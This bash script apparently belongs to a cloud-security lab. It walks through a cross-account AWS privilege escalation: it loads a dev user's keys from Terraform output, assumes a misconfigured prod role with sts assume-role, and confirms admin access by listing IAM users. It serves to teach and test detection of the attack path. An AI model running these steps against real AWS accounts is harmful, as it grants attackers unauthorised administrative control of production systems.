#!/bin/bash

# Demo script for cross-account simple-role-assumption privilege escalation
# This scenario demonstrates cross-account role assumption from dev to prod for admin access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER_DEV="pl-dev-xsare-to-admin-starting-user"
TARGET_ROLE_PROD="pl-prod-xsare-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Cross-Account Simple Role Assumption Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_dev_to_prod_one_hop_simple_role_assumption.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract target role ARN from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_DEV"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user in dev account
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials (dev account)${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
DEV_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Current identity: $CURRENT_USER"
echo "Dev Account ID: $DEV_ACCOUNT_ID"

if [[ ! $CURRENT_USER == *"$STARTING_USER_DEV"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER_DEV${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity in dev account${NC}\n"

# Step 3: Extract prod account ID from target role ARN
echo -e "${YELLOW}Step 3: Identifying prod account${NC}"
PROD_ACCOUNT_ID=$(echo $TARGET_ROLE_ARN | cut -d':' -f5)
echo "Prod Account ID: $PROD_ACCOUNT_ID"
echo -e "${GREEN}✓ Extracted prod account ID from target role ARN${NC}\n"

# Step 4: Verify lack of admin access in prod account
echo -e "${YELLOW}Step 4: Verifying we don't have admin access in prod yet${NC}"
echo "Attempting to list IAM users in prod account (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Assume the prod target role
echo -e "${YELLOW}Step 5: Assuming the target role in prod account${NC}"
echo "Target Role ARN: $TARGET_ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $TARGET_ROLE_ARN \
    --role-session-name cross-account-demo-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
CURRENT_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo "Current Account ID: $CURRENT_ACCOUNT_ID"

if [[ ! $ROLE_IDENTITY == *"$TARGET_ROLE_PROD"* ]]; then
    echo -e "${RED}Error: Failed to assume target role${NC}"
    exit 1
fi

if [ "$CURRENT_ACCOUNT_ID" != "$PROD_ACCOUNT_ID" ]; then
    echo -e "${RED}Error: Not in prod account after role assumption${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully assumed role in prod account${NC}\n"

# Step 6: Verify administrator access in prod account
echo -e "${YELLOW}Step 6: Verifying administrator access in prod account${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED IN PROD ACCOUNT${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_DEV in dev account ($DEV_ACCOUNT_ID)"
echo "2. Assumed role: $TARGET_ROLE_PROD in prod account ($PROD_ACCOUNT_ID)"
echo "3. Achieved: Administrative access in prod account"

echo -e "\n${YELLOW}Cross-Account Attack Path:${NC}"
echo "dev:$STARTING_USER_DEV → (sts:AssumeRole) → prod:$TARGET_ROLE_PROD → admin access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- No persistent artifacts created"
echo "- Role assumption created temporary session credentials that will expire"

echo -e "\n${BLUE}ℹ This demonstrates a cross-account privilege escalation path${NC}"
echo -e "${BLUE}An attacker with dev account credentials can gain admin access to prod${NC}"

echo -e "\n${YELLOW}To clean up (no cleanup needed for this scenario):${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
